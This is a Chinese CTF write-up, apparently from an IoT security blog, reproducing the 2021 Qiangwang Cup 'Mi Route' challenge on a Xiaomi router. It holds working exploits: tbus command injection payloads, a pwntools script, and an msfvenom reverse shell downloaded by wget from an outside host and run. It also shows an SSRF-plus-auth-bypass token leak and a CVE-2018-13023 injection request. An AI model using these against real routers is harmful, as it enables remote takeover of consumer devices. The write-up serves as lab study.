# 2021强网杯赛题Mi Route复现
> l1s00t
> 来源：https://www.iotsec-zone.com/article/419

# 2021强网杯赛题Mi Route复现

这篇文章笔者也是鸽了好久，直到最近，才基本写完。期间，参考了很多大佬的文章，在此向各位佬磕一个。
话不多说，直接开始。

## 题目要求

![0.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj0xancyjkrmekif.png)

## 题目获取

1. 购买小米路由器PRO
2. 刷入开发板固件2.13.65，小米路由器下载地址[http://www1.miwifi.com/miwifi_download.html](http://www1.miwifi.com/miwifi_download.html)
3. 开启小米路由器ssh，具体参考[https://blog.csdn.net/desertworm/article/details/117958369](https://blog.csdn.net/desertworm/article/details/117958369)
4. 打patch

```shell
cp /usr/lib/lua/traffic.lua /tmp
sed -i 's/:gsub("%$", "\\\\$")//g' /tmp/traffic.lua 
mount -o bind /tmp/traffic.lua /usr/lib/lua//traffic.lua
```

## 基本分析

### 题目分析

在读完题目后，可以得到以下要点：

1. 实现未授权RCE，并挂载黑页
2. 题目选手端开启了ssh
3. 题目固件是patch过的，也即题目漏洞可能是出题人故意造的，也有可能修复一些未知bug。

### 寻找patch点

这里应该是下载原版固件，然后使用diff分析patch点。这里我们是用原件patch过的，也没必要分析patch点了。

### 信息收集

1. 端口扫描

```shell
sudo nmap -sT -sU -p 0-65535 192.168.31.1
```

![1.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj0ryzkd19abf1gv.png)

没有发现什么可疑端口。有点怪，ssh端口没有扫描出来。

2. 小米路由器是对开源框架openwrt进行的二次开发，漏洞分析的过程实际上类似于lua代码审计。

3. 历史漏洞复现与历史CVE。

## 预期解

分析patch文件`traffic.lua`

patch前

```lua
function cmdfmt(str)
  return str:gsub("\\", "\\\\"):gsub("`", "\\`"):gsub("\"", "\\\""):gsub("%$", "\\$")
end
```

patch后

```lua
function cmdfmt(str)
  return str:gsub("\\", "\\\\"):gsub("`", "\\`"):gsub("\"", "\\\"")
end
```

patch后的`cmdfmt`并未对`$`进行转义，可能存在命令注入漏洞。

```lua
function trafficd_lua_ecos_pair_verify(repeater_token)
    local code
    local token
    local ssid
    local ssid_pwd
    local ssid_type
    local ssid_hidden
    local bssid
    local device_id
    local cjson=require("json")
    local pp
    local ifname
    local ifname_tmp
    local wl_index = 1
    local wl_cnt
    local i

    pp = io.popen("uci get misc.wireless.ifname_2G")
    ifname = pp:read("*line")
    pp:close()

    pp = io.popen("uci get misc.wireless.wl_if_count")
    wl_cnt = pp:read("*line")
    pp:close()

    if ifname ~= nil and wl_cnt ~= nil then
        wl_cnt = tonumber(wl_cnt)
        if wl_cnt ~= nil then
            for i=0,wl_cnt,1 do
                pp = io.popen(string.format("uci get wireless.@wifi-iface[%d].ifname",i))
                ifname_tmp = pp:read("*line")
                pp:close()
                if ifname_tmp == ifname then
                    wl_index = i
                    break
                end
            end
        end
    end

    os.execute(string.format('/usr/sbin/ecos_pair_verify -i "%s" -e "%s" ', cmdfmt(ifname), cmdfmt(repeater_token)))
    file = io.open("/tmp/ecos.log","r")
    if file ~= nil then
        for line in file:lines() do
            local tt = cjson.decode(line)
            code = tt['code']
            token = tt['token']
            ssid = tt['ssid']
            ssid_pwd = tt['ssid_pwd']
            ssid_type = tt['ssid_type']
            ssid_hidden = tt['ssid_hidden']
            bssid = tt['bssid']
            device_id = tt['device_id']
            os.execute("logger " .. code)
            os.execute("logger " .. token)
            os.execute("logger " .. ssid)
            os.execute("logger " .. ssid_pwd)
            os.execute("logger " .. ssid_type)
            os.execute("logger " .. ssid_hidden)
            os.execute("logger " .. bssid)
            os.execute("logger " .. device_id)
        end
        file:close()
    end
    return code,token,ssid,ssid_pwd,ssid_type,ssid_hidden,bssid,device_id
end
```

`trafficd_lua_ecos_pair_verify`执行了经过`cmdfmt`处理的参数，存在命令注入漏洞。

接着，我们就想办法触发这条调用链。

全局搜索

```sh
grep -ri "trafficd_lua_ecos_pair_verify" 2>/dev/null
```

![2.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj2cojqicqjr3bcp.png)

字符串定位，定位到`sub_402070`

![3.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj2lwdzwszmf713g.png)

交叉引用，发现没有函数调用`sub_402070`。

发现.data段存在很多.byte，可以使用快捷键**d**转换未.word类型。这里使用IDAPython脚本转换。

```python
import idaapi
import ida_bytes
import idc

def MakeDword(ea):
    if idaapi.IDA_SDK_VERSION < 700:
        return idc.MakeDword(ea)
    else:
        return ida_bytes.create_data(ea, FF_DWORD, 4, idaapi.BADADDR)        

start_addr = 0x00416564
end_addr = 0x004165e8

while start_addr < end_addr:
    MakeDword(start_addr)
    start_addr += 4
```

转换成功后，再次对`sub_402070`交叉引用，找到了引用的地方，但还是猜测不出调用链。

![4.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj2txw3470mwrfmd.png)

这里我们看main函数，看到了字符串**tbus_init**。

![5.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj2zv3xtvxyudjgg.png)

这里需要知道的是，tbus类似于openwrt的ubus，而ubus是用来作为进程间通信的，是一种类似总线结构的通信方式。关于ubus详细介绍可以看[https://gtrboy.github.io/posts/bus/与https://e-mailky.github.io/2017-08-14-ubus](https://gtrboy.github.io/posts/bus/与https://e-mailky.github.io/2017-08-14-ubus)。

与此同时，发现小米路由器提供了`tbus`命令。

![6.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj35wljvx3quva0y.png)

`netapi`作为一个对象，其上定义了函数与参数。所以，我们要想办法找对应的函数与参数。

继续分析`main`函数。

![7.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj3c9ubigiidq28b.png)

根据后续字符串**add_object**，猜测`sub_40478c`函数的作用是初始化`tbus`。

查看参数`dword_4165A8`。

![8.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj3i1q8jenbqwx3r.png)

猜测是一个结构体。由于存在netapi与init字符串，合理猜测，`netapi`对象定义了`init`方法。再由上述`sub_402070`交叉引用的结果，猜测参数为`data`。

接着，就是使用`tbus call`进行验证了。
在此之前，我们可以全局搜索`tbus`。

![9.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj3q4a2ukr25eksl.png)

这里搜到了很多关键信息。比如，tbus call的参数格式为json格式，与ubus类似；tbus监听端口为784。
使用netstat查看端口信息。

![10.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj489jn60jmazwlc.png)

端口784运行的程序为trafficd，也即tbus服务端。

验证的payload为：

```shell
tbus call netapi init '{"data": "aaa$(touch /tmp/haha)"}'
```

![11.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj4vmuy43164aaxy.png)

成功验证了我们的思路。
之后，使用msfvenom生成反弹shell，然后上传即可。

```shell
msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=192.168.31.14  LPORT=1234 -f elf -o backdoor
```
实现反弹shell。

```shell
tbus call netapi init '{"data": "aaa$(wget http://192.168.31.14:8000/backdoor -O /tmp/backdoor; chmod +x /tmp/backdoor; /tmp/backdoor)"}'
```

![12.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj60ax786gqlor8q.png)

接下来，就是想办法外部触发tbus。

由上述`netstat`结果可知，`tbus`服务端运行在784端口，且IP地址为**0.0.0.0**，所以我们外部是直接可以访问784端口的。服务器内部存在`tcpdump`，进行流量分析。

![13.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj6acp4wzticfwzm.png)

可以看到，`trafficd`与`netapi`的通信是通过**127.0.0.1**进行的，所以我们对ip地址为127.0.0.1的网卡进行抓包即可。

```sh
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@192.168.31.1 "tcpdump -i lo -s 0 -w /tmp/miwifi.pcap"
```

路由器内部执行tbus call。

```sh
tbus call netapi init '{"data": "$(sleep 3)"}'
```

之后，我们将获取的**/tmp/miwifi.pcap**传输到主机，使用wireshark进行分析。

使用`tcp.port == 784 && data`过滤出命令执行的包。

![14.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj6iftjm1kqch1sx.png)

通过三次抓包分析，每次只有两个部分不同，猜测为token字段。

![15.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj6my74e22bz13ym.png)

继续分析，发现每次连接都会发送序号为48的包的data，然后服务器端返回一个序号为50的包，其中带有token字段。

所以，我们通过流量来间接调用tbus来进行命令注入。

最终利用脚本如下：

```python
from pwn import *

p = remote('192.168.31.1', 784)

p.recv()

data = '0004010000000000000000100200000b6e65746170690000'
payload = bytes.fromhex(data)
print(payload)
p.send(payload)

token_data = p.recv()
token = token_data[28:32]
print(token)

p.recv()

shell = b'$(wget http://192.168.31.14:8000/backdoor -O /tmp/backdoor; chmod +x /tmp/backdoor; /tmp/backdoor)'

payload = f'''
00050200{token[::-1].hex()}0000008c03000008{token.hex()}04000009696e697400000000070000748300006f000464617461000061616124287767657420687474703a2f2f3139322e3136382e33312e31343a383030302f6261636b646f6f72202d4f202f746d702f6261636b646f6f723b2063686d6f64202f746d702f6261636b646f6f723b202f746d702f6261636b646f6f72290000
'''
payload = bytes.fromhex(payload)
print(payload)
p.send(payload)

sleep(1)
```

![16.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj6sam9bvmw6hunk.png)

## 非预期解

分析nginx服务的配置文件`/etc/sysapihttpd/sysapihttpd.conf` 

```nginx
server {
            listen 8197;
            # resolver 8.8.8.8;
            resolver 127.0.0.1 valid=30s;
            log_format log_subfilter '"$server_addr"\t"$host"\t"$remote_addr"\t"$time_local"\t"$request_method $request_uri"\t"$status"\t"$request_length"\t"$bytes_sent"\t"$request_time"\t"$sent_http_ MiCGI_Cache_Status"\t"$upstream_addr"\t"$upstream_response_time"\t"$http_referer"\t"$http_user_agent"';
            access_log off;
            #access_log /userdisk/data/proxy_8197.log  log_subfilter;
            #error_log /userdisk/sysapihttpd/log/error.log info;

            location / {
                    proxy_set_header Accept-Encoding "";
                    proxy_pass http://$http_host$request_uri;
                    add_header  XQ-Mark 'subfilter';
                    proxy_connect_timeout 600;
                    proxy_read_timeout 600;
                    proxy_send_timeout 600;
                    #sub_filter '</body>' '<div style="display:none">XQ Sub-Filter</div></body>';
                    sub_filter '</head>' '<script type="text/javascript"></script></head>';
            }
    }
```

可以发现，反向代理**prxoy_pass** `http://$http_host$request_uri`，并没有对请求的url进行限制，存在**ssrf**漏洞。

审计`/usr/lib/lua/luci`目录下的lua脚本。

可以发现，`dispatcher.lua`存在认证绕过漏洞。

```lua
local ip = http.getenv("REMOTE_ADDR")
local host = http.getenv("HTTP_HOST")
local isremote = ip == "127.0.0.1" and host == "localhost"
if _sdkFilter(track.flag) and not isremote then
    local sdkutil = require("xiaoqiang.util.XQSDKUtil")
    if not sdkutil.checkPermission(getremotemac()) then
        context.path = {}
        luci.http.write([[{"code":1500,"msg":"Permission denied"}]])
        return
    end
end
if not isremote and not _noauthAccessAllowed(track.flag) and track.sysauth then
    local sauth = require "luci.sauth"
    local crypto = require "xiaoqiang.util.XQCryptoUtil"
    local sysutil = require "xiaoqiang.util.XQSysUtil"
    local isBinded = sysutil.getPassportBindInfo()

    local authen = type(track.sysauth_authenticator) == "function"
    and track.sysauth_authenticator
    or authenticator[track.sysauth_authenticator]

    local def  = (type(track.sysauth) == "string") and track.sysauth
    local accs = def and {track.sysauth} or track.sysauth
    local sess = ctx.urltoken.stok
    local sdat = sauth.read(sess)
    local user
    if sdat then
        if ctx.urltoken.stok == sdat.token and (not sdat.ip or (sdat.ip and sdat.ip == ip)) then
            user = sdat.user
        end
    else
        local eu = http.getenv("HTTP_AUTH_USER")
        local ep = http.getenv("HTTP_AUTH_PASS")
        if eu and ep and luci.sys.user.checkpasswd(eu, ep) then
            -- authen = function() return eu end
            local logger = require("xiaoqiang.XQLog")
            logger.log(4, "Native Luci: HTTP_AUTH_USER & HTTP_AUTH_PASS")
        end
    end

    if not util.contains(accs, user) then
        if authen then
            ctx.urltoken.stok = nil
            local user, logintype = authen(nil, accs, def)
            if not user or not util.contains(accs, user) then
                return
            else
                local sid = sess or luci.sys.uniqueid(16)
                local ltype = logintype or "2"
                local token = luci.sys.uniqueid(16)
                sauth.reap()
                sauth.write(token, {
                        user=user,
                        token=token,
                        ltype=ltype,
                        ip=ip,
                        secret=luci.sys.uniqueid(16)
                    })
                ctx.urltoken.stok = token
                ctx.authsession = token
                ctx.authuser = user
            end
        else
            luci.http.status(403, "Forbidden")
            return
        end
    else
        ctx.authsession = sess
        ctx.authuser = user
    end
end
```

当 **`isremote = 1`**时，也即`ip == "127.0.0.1" and host == "localhost"`，可以绕过登录限制。

全局搜索**token**相关字段，发现`/usr/lib/lua/luci/controller/api/xqsystem.lua`存在**token**泄露。

```lua
entry({"api", "xqsystem", "renew_token"}, call("renewToken"), (""), 136)

function renewToken()
    local datatypes = require("luci.cbi.datatypes")
    local sauth = require "luci.sauth"
    local result = {}
    local ip = LuciHttp.formvalue("ip")
    if ip and not datatypes.ipaddr(ip) then
        ip = nil
    end
    local session = sauth.available(ip)
    if session and session.token then
        result["token"] = session.token
    else
        local token = luci.sys.uniqueid(16)
        sauth.write(token, {
            user="admin",
            token=token,
            ltype="2",
            ip=ip,
            secret=luci.sys.uniqueid(16)
        })
        result["token"] = token
    end
    result["code"] = 0
    LuciHttp.write_json(result)
end
```

结合上述ssrf漏洞，以及认证绕过漏洞，可以泄露出认证字段token。

```sh
curl -v http://192.168.31.1:8197/cgi-bin/luci/api/xqsystem/token -H 'Host: localhost'
```

至于请求的target，我们可以在上述nginx配置字段中发现，这里不再赘述。

![17.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj6ztbay6ojsk1m5.png)

解决了认证的问题，接着就是想办法找到命令注入之类的漏洞了。

通过对历史CVE的搜索以及验证，可以发现[CVE-2018-13023](https://blog.securityevaluators.com/hack-routers-get-toys-exploiting-the-mi-router-3-1d7fd42f0838)漏洞并未修复。该漏洞描述大致为：认证后命令注入。

该漏洞位于`/usr/lib/lua/luci/controller/api/misns.lua`

```lua
entry({"api", "misns", "wifi_access"},           call("wifiAccess"), (""), 203)

function wifiAccess()
    local result = {
        ["code"] = 0
    }
    local sns = LuciHttp.formvalue("sns")
    local guid = LuciHttp.formvalue("guest_user_id")
    local expayload = LuciHttp.formvalue("extra_payload")
    local mac = LuciHttp.formvalue("mac")
    local dev_timeout = LuciHttp.formvalue("timeout")
    local grant = tonumber(LuciHttp.formvalue("grant")) or 1
    if not dev_timeout then
        dev_timeout=""
    end
    if not mac or not LuciDatatypes.macaddr(mac) then
        result.code = 1523
    else
        local repeat_request = XQWifiShare.check_repeat_request(mac)
        XQWifiShare.wifi_access(mac, sns, dev_timeout, guid, grant, expayload)
        if grant == 1 then
            local json = require("json")
            local push = require("xiaoqiang.XQPushHelper")
            local name = ""
            if not XQFunction.isStrNil(expayload) then
                local succ, info = pcall(json.decode, expayload)
                if succ and info then
                    name = info.nickname
                end
            end
            if sns and sns ~= "wifirent" and sns ~= "direct_request" and not repeat_request then
                push._guestWifiConnectPush(mac, sns, name)
            end
        end
        if sns and sns == "direct_request" and grant == 0 then
            XQWifiShare.wifi_share_blacklist_edit({mac}, "+")
        end
    end
    if result.code ~= 0 then
        result["msg"] = XQErrorUtil.getErrorMessage(result.code)
    end
    LuciHttp.write_json(result)
end
```

漏洞点位于`XQWifiShare.wifi_access`，该函数并未对用户输入的内容进行限制，导致存在任意命令注入漏洞。

```lua
function forkExec(command)
    local Nixio = require("nixio")
    local pid = Nixio.fork()
    if pid > 0 then
        return
    elseif pid == 0 then
        Nixio.chdir("/")
        local null = Nixio.open("/dev/null", "w+")
        if null then
            Nixio.dup(null, Nixio.stderr)
            Nixio.dup(null, Nixio.stdout)
            Nixio.dup(null, Nixio.stdin)
            if null:fileno() > 2 then
                null:close()
            end
        end
        Nixio.exec("/bin/sh", "-c", command)
    end
end

function wifi_access(mac, sns, timeout, uid, grant, extra)
    local uci = require("luci.model.uci").cursor()
    if XQFunction.isStrNil(mac) then
        return false
    end
    local mac = XQFunction.macFormat(mac)
    local key = mac:gsub(":", "")
    local info = uci:get_all("wifishare", key)

    if info then
        info["mac"] = mac
        if not XQFunction.isStrNil(sns) then
            info["sns"] = sns
        end
        if not XQFunction.isStrNil(uid) then
            info["guest_user_id"] = uid
        end
        if not XQFunction.isStrNil(extra) then
            info["extra_payload"] = extra
        end
        if grant then
            if grant == 0 then
                info["disabled"] = "1"
            elseif grant == 1 then
                info["disabled"] = "0"
            end
        end
    else
        if XQFunction.isStrNil(sns) or XQFunction.isStrNil(uid) or not grant then
            return false
        end
        info = {
            ["mac"] = mac,
            ["state"] = "auth",
            ["sns"] = sns,
            ["guest_user_id"] = uid,
            ["extra_payload"] = extra,
            ["disabled"] = grant == 1 and "0" or "1"
        }
    end
    uci:section("wifishare", "device", key, info)
    uci:commit("wifishare")
    if grant then
        if grant == 0 then
            if sns ~= "direct_request" then
                os.execute("/usr/sbin/wifishare.sh deny "..mac)
            end
        elseif grant == 1 then
            XQFunction.forkExec("sleep 2; /usr/sbin/wifishare.sh allow "..mac .." " ..sns .." " ..timeout)
        end
    end
    return true
end
```

当**`grand == 1`**时，执行` XQFunction.forkExec`函数，该函数并未对参数进行过滤，仅仅开启子进程执行命令，导致命令注入漏洞。

验证payload如下：在**/tmp**目录下创建文件。

```
GET /cgi-bin/luci/;stok=0cfc176dfdf971d012e7d745a6d219d9/api/misns/wifi_access?mac=00:00:00:00:00:00&sns=%3b%0atouch%09/tmp/l1s00t%0a%23&grant=1&guest_user_id=guid&timeout=timeout HTTP/1.1
Host: 192.168.31.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.31.1/cgi-bin/luci/;stok=3fbce4dd5205d9b7940c26b877121cd5/web/home
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: __guid=86847064.1832874651309614000.1694922718469.7314; psp=admin|||2|||0; monitor_count=23
Connection: close

```

![18.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj7a37mejaejow5m.png)

![19.png](https://www.iotsec-zone.com/api/image/v2/20230920/cvnj7d3z29l1kyb1vd.png)

剩下的部分是跟预期解类似的过程，也就不再赘述了。

## 总结

通过对赛题的分析，学到了很多。具体如下：

1. 学到了设备的分析思路
2. 了解了openwrt以及ubus(tubs)的通信方法
3. 学习了nginx的配置，以及容易出现疏漏的地方
4. 学到了多个漏洞利用方法

到这里，这道题的复现算是基本完成了，收获很大，继续加油。

## 参考文章

[https://xuanxuanblingbling.github.io/iot/2021/07/15/mirouter/](https://xuanxuanblingbling.github.io/iot/2021/07/15/mirouter/)

[https://github.com/ReAbout/ctf-writeup/blob/master/qwb-2021-final/mirouter-wp.md](https://github.com/ReAbout/ctf-writeup/blob/master/qwb-2021-final/mirouter-wp.md)

[https://e-mailky.github.io/2017-08-14-ubus](https://e-mailky.github.io/2017-08-14-ubus)

[https://www.anquanke.com/post/id/247597](https://www.anquanke.com/post/id/247597)

[https://mp.weixin.qq.com/s/ykrkcPXNyLjxh67GSJLOEA](https://mp.weixin.qq.com/s/ykrkcPXNyLjxh67GSJLOEA)

[https://www.cnblogs.com/miruier/p/13907150.html](https://www.cnblogs.com/miruier/p/13907150.html)

[https://zhuanlan.zhihu.com/p/83890573](https://zhuanlan.zhihu.com/p/83890573)
